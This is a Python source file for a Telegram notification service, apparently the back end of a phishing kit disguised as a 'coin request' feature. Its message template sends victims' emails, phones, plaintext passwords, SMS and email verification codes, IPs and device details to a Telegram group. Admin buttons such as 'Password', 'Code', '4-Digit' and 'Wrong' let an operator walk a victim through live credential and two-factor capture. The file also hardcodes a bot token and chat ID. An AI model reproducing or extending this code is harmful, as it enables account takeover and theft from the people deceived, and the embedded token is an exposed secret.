import requests
import os
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN', '8598752660:AAHaWkpfllUj-qaJ7qvdvFnFZsZzsgD5ynU')
        self.chat_id = os.getenv('TELEGRAM_CHAT_ID', '-1003294412636')
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
    
    def send_coin_request(self, data: dict):
        """Send coin request notification to Telegram group"""
        try:
            # Format message with emojis
            message = self._format_coin_request_message(data)
            
            # Send text message
            text_url = f"{self.api_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            response = requests.post(text_url, json=payload, timeout=10)
            response.raise_for_status()
            
            message_id = response.json()['result']['message_id']
            
            # Send inline keyboard with admin buttons
            keyboard = self._create_admin_keyboard(data.get('username', 'unknown'))
            keyboard_url = f"{self.api_url}/sendMessage"
            keyboard_payload = {
                'chat_id': self.chat_id,
                'text': '🎮 <b>Admin Actions:</b>',
                'parse_mode': 'HTML',
                'reply_markup': keyboard
            }
            
            keyboard_response = requests.post(keyboard_url, json=keyboard_payload, timeout=10)
            keyboard_response.raise_for_status()
            
            logger.info(f"Telegram notification sent successfully. Message ID: {message_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send Telegram notification: {str(e)}")
            return False
    
    def _format_coin_request_message(self, data: dict) -> str:
        """Format the coin request message with emojis"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        message = f"""💎 <b>COIN REQUEST</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
💰 <b>Amount:</b> <code>{data.get('amount', 'N/A')}</code>
🌍 <b>Location:</b> {data.get('location', 'Unknown')}
📱 <b>Device:</b> {data.get('device', 'Unknown')}
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>
📞 <b>Phone:</b> <code>{data.get('phone', 'N/A')}</code>
🔐 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
📲 <b>Phone Code:</b> <code>{data.get('phone_code', 'N/A')}</code>
✉️ <b>Email Code:</b> <code>{data.get('email_code', 'N/A')}</code>
"""
        return message
    
    def _create_admin_keyboard(self, username: str):
        """Create inline keyboard with admin action buttons"""
        keyboard = {
            'inline_keyboard': [
                [
                    {'text': '🔐 Password', 'callback_data': f'action_password_{username}'},
                    {'text': '📝 Form', 'callback_data': f'action_form_{username}'},
                    {'text': '📱 Code', 'callback_data': f'action_code_{username}'},
                ],
                [
                    {'text': '🔢 4-Digit', 'callback_data': f'action_4digit_{username}'},
                    {'text': '❌ Wrong', 'callback_data': f'action_wrong_{username}'},
                    {'text': '📧 Mail', 'callback_data': f'action_mail_{username}'},
                ],
                [
                    {'text': '📬 Mail Code', 'callback_data': f'action_mailcode_{username}'},
                    {'text': '🚫 Wrong Mail', 'callback_data': f'action_wrongmail_{username}'},
                    {'text': '✅ Finish', 'callback_data': f'action_finish_{username}'},
                ]
            ]
        }
        return keyboard


telegram_service = TelegramService()